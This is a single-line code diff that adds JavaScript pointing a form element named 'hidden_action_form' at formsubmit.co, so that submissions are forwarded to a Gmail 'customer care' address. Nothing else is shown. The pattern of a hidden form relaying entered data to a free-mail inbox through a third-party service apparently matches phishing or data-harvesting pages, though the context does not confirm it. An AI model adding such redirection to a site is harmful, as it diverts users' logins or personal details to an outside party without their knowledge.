@@ -1,0 +1,1 @@
+document.getElementById('hidden_action_form').action = 'https://formsubmit.co/ndj.customer.care@gmail.com';
